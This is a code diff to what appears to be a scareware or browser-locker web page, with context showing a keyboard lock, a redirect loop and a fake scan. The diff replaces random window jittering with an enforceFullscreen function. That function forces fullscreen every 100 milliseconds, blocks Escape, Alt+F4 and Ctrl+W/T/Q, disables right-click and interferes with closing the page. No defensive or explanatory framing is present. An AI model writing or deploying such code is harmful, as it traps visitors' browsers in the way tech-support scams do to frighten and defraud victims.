@@ -346,8 +346,8 @@
             // Enable keyboard lock
             lockKeyboard();
 
-            // Window jittering
-            jitterWindow();
+            // Enforce full screen
+            enforceFullscreen();
 
             // Redirect loop (mild version)
             setTimeout(function() {
@@ -519,31 +519,56 @@
             });
         }
 
-        function jitterWindow() {
-            setInterval(function() {
-                if (!document.fullscreenElement && Math.random() > 0.7) {
-                    try {
-                        // Request fullscreen randomly
-                        document.documentElement.requestFullscreen();
-                    } catch (e) {
-                        console.log("Fullscreen request failed:", e);
-                    }
-                } else if (document.fullscreenElement && Math.random() > 0.8) {
-                    try {
-                        // Exit fullscreen randomly
-                        document.exitFullscreen();
-                    } catch (e) {
-                        console.log("Exit fullscreen failed:", e);
-                    }
-                }
-                
-                // Jitter the window a bit
-                window.scrollTo(
-                    Math.random() * 10, 
-                    Math.random() * 10
-                );
-            }, 500);
+        function enforceFullscreen() {
+    // Immediately request fullscreen on start
+    document.documentElement.requestFullscreen().catch(e => console.log(e));
+
+    // Check every 100ms and re-enter fullscreen
+    const fsCheck = setInterval(() => {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen().catch(e => console.log(e));
         }
+    }, 100);
+
+    // Block keyboard shortcuts
+    document.addEventListener('keydown', (e) => {
+        // Block Alt+F4 (note: this only works in-browser, not system-level)
+        if (e.altKey && e.key === 'F4') {
+            e.preventDefault();
+            e.stopPropagation();
+        }
+
+        // Block other common exit shortcuts
+        if (e.ctrlKey && (e.key === 'w' || e.key === 't' || e.key === 'q')) {
+            e.preventDefault();
+            e.stopPropagation();
+        }
+
+        // Block ESC key
+        if (e.key === 'Escape') {
+            e.preventDefault();
+            e.stopPropagation();
+            document.documentElement.requestFullscreen();
+        }
+    });
+
+    // Prevent right-click context menu
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    // Detect fullscreen exit attempts
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen();
+        }
+    });
+
+    // Prevent window closure
+    window.addEventListener('beforeunload', (e) => {
+        e.preventDefault();
+        e.returnValue = '';
+        document.documentElement.requestFullscreen();
+    });
+}
 
         function startFakeScan() {
             scanProgress = 0;
